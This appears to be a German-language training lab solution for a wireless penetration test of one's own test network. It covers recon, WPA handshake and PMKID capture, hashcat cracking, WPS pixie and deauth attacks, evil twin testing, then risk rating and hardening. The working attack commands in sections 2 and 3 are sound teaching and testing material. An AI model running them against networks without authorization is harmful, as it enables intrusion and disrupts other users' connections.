# Lösung – Übung 10: Vollständiges Wireless Assessment

Beispiel gegen eigenes Test-WLAN. `wireless-report-template.md` ist das Gerüst.

## 1. Recon

```bash
sudo airmon-ng check kill; sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon            # SSID/BSSID/CH/ENC/Clients
sudo wash -i wlan0mon                # WPS-Status
```
Erfassen: Verschlüsselung (WPA2/WPA3), PMF, WPS, Clients.

## 2. PSK-Angriff

```bash
# Handshake:
sudo airodump-ng --bssid <BSSID> -c <CH> -w hs wlan0mon
sudo aireplay-ng --deauth 3 -a <BSSID> -c <CLIENT> wlan0mon
# PMKID:
sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1
# cracken:
hcxpcapngtool -o hs.22000 hs-01.cap
hashcat -m 22000 hs.22000 rockyou.txt
```
→ PSK-Stärke bewerten (fiel sie? wie schnell?).

## 3. WPS / Deauth / Evil Twin

```bash
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K 1 -vv      # WPS pixie
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT> wlan0mon   # PMF-Test
sudo airgeddon                                            # Evil-Twin-Anfälligkeit
```
Alternativ vieles automatisiert:
```bash
sudo wifite --kill
```

## 4. Findings & Risiko

Tabelle wie im Template: je Schwäche Nachweis + Risiko (schwache PSK/WPS = Critical; kein PMF/Evil-Twin = High; kein WPA3 = Medium).

## 5. Report

`wireless-report-template.md` ausfüllen: Erfassung, Findings mit Nachweis, priorisierte Härtung, Captures im Anhang.

## Härtung (gebündelt)

- **Lange zufällige PSK**, **WPS aus**, **802.11w/PMF**, **WPA3** (bzw. 802.1X/EAP mit Server-Zert-Validierung), **WIDS/WIPS** + Rogue-AP-Detection, Gäste-/IoT-Segmentierung.

## Häufige Fehler / Troubleshooting

- **Kein Monitor/Injection:** Adapter-Chipsatz (Übung 01).
- **Nichts gecrackt:** starke PSK → im Report als **Stärke** vermerken, nicht als Fehlschlag.
- **wifite greift zu breit:** auf eigenen BSSID beschränken (`--bssid`), nur eigener AP.
- **Report ohne Nachweis:** Captures/Befehle je Finding beilegen.
